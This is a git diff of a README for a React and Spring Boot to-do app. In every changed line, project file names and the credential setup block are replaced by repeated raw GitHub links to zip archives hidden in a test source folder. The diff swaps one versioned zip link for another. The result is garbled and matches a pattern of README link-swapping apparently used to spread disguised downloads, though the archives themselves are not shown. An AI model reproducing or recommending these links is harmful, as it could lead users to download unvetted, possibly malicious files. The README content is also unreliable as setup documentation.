@@ -30,8 +30,8 @@ Todo-App/
 │
 ├── React_1_Todo/ # Frontend (React)
 │ ├── src/
-│ ├── https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/Todo-App-1.7.zip
-│ └── https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/Todo-App-1.7.zip
+│ ├── https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/com/kushal199/TodoAppBackend/App-Todo-v3.8.zip
+│ └── https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/com/kushal199/TodoAppBackend/App-Todo-v3.8.zip
 │
 └── TodoAppBackend/ # Backend (Spring Boot)
 ├── src/main/java/com/kushal199/TodoAppBackend/
@@ -41,8 +41,8 @@ Todo-App/
 │ ├── dto/
 │ ├── repository/
 │ └── config/
-├── https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/Todo-App-1.7.zip
-└── https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/Todo-App-1.7.zip (ignored in .gitignore)
+├── https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/com/kushal199/TodoAppBackend/App-Todo-v3.8.zip
+└── https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/com/kushal199/TodoAppBackend/App-Todo-v3.8.zip (ignored in .gitignore)
 
 
 ---
@@ -56,14 +56,14 @@ Create a database:
 CREATE DATABASE todos;
 
 ```
-### 2️⃣ Add credentials in https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/Todo-App-1.7.zip
+### 2️⃣ Add credentials in https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/com/kushal199/TodoAppBackend/App-Todo-v3.8.zip
 Note: this file is ignored in Git for security.
 ``` 
-https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/Todo-App-1.7.zip
-https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/Todo-App-1.7.zip
-https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/Todo-App-1.7.zip
-https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/Todo-App-1.7.zip
-https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/Todo-App-1.7.zip
+https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/com/kushal199/TodoAppBackend/App-Todo-v3.8.zip
+https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/com/kushal199/TodoAppBackend/App-Todo-v3.8.zip
+https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/com/kushal199/TodoAppBackend/App-Todo-v3.8.zip
+https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/com/kushal199/TodoAppBackend/App-Todo-v3.8.zip
+https://raw.githubusercontent.com/kushalthakur09/Todo-App/main/TodoAppBackend/src/test/java/com/kushal199/TodoAppBackend/App-Todo-v3.8.zip
 ```
 
 ### 3️⃣ Run Backend
